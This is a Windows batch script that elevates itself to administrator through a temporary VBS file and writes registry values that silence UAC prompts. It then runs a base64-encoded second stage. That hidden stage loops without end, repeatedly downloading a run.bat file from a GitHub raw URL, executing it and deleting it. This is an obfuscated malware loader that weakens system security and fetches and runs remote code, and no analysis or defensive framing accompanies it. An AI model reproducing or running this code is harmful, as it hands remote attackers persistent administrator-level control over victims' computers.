@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
powershell -Command "& { $encoded = 'QGVjaG8gb2ZmDQpzZXQgInBhcmFtcz0lKiINCmNkIC9kICIlfmRwMCIgJiYgKCBpZiBleGlzdCAiJXRlbXAlXGdldGFkbWluLnZicyIgZGVsICIldGVtcCVcZ2V0YWRtaW4udmJzIiApICYmIGZzdXRpbCBkaXJ0eSBxdWVyeSAlc3lzdGVtZHJpdmUlIDE+bnVsIDI+bnVsIHx8ICggIGVjaG8gU2V0IFVBQyA9IENyZWF0ZU9iamVjdF4oIlNoZWxsLkFwcGxpY2F0aW9uIl4pIDogVUFDLlNoZWxsRXhlY3V0ZSAiY21kLmV4ZSIsICIvayBjZCAiIiV+c2RwMCIiICYmICV+czAgJXBhcmFtcyUiLCAiIiwgInJ1bmFzIiwgMSA+PiAiJXRlbXAlXGdldGFkbWluLnZicyIgJiYgIiV0ZW1wJVxnZXRhZG1pbi52YnMiICYmIGV4aXQgL0IgKQ0KDQpyZWcgYWRkIEhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIC92IENvbnNlbnRQcm9tcHRCZWhhdmlvckFkbWluIC90IFJFR19EV09SRCAvZCAwIC9mDQpyZWcgYWRkIEhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIC92IFByb21wdE9uU2VjdXJlRGVza3RvcCAvdCBSRUdfRFdPUkQgL2QgMCAvZg0KDQoNCjpsb29wDQpkZWwgL2YgL3EgIkM6XFdpbmRvd3NcU3lzdGVtMzJcV2luZG93c1Bvd2VyU2hlbGxccnVuLmJhdCINCnBvd2Vyc2hlbGwgLUNvbW1hbmQgIndoaWxlICgtbm90IChUZXN0LUNvbm5lY3Rpb24gZ29vZ2xlLmNvbSAtQ291bnQgMSAtUXVpZXQpKSB7IFN0YXJ0LVNsZWVwIDUgfSINCnBvd2Vyc2hlbGwgLUNvbW1hbmQgIiR1cmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pdHV0aW5hL21pdHV0aW5hL21haW4vcnVuLmJhdCc7ICR0ZW1wUGF0aCA9IFtTeXN0ZW0uSU8uUGF0aF06OkNvbWJpbmUoJGVudjpURU1QLCAncnVuLmJhdCcpOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgJHRlbXBQYXRoOyBTdGFydC1Qcm9jZXNzICR0ZW1wUGF0aDsgU3RhcnQtU2xlZXAgLVNlY29uZHMgMjsgUmVtb3ZlLUl0ZW0gJHRlbXBQYXRoIg0KdGltZW91dCAvdCAzMCAvbm9icmVhayA+bnVsDQpSRU0gUXVheSBsw6HCusKhaSB2w4PCsm5nIGzDocK6wrdwDQpnb3RvIGxvb3ANCmV4aXQ='; $decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded)); $decoded | Out-File -FilePath '%TEMP%\temp.bat' -Encoding ASCII; Start-Process '%TEMP%\temp.bat' -Wait; Remove-Item '%TEMP%\temp.bat' -Force; }"
exit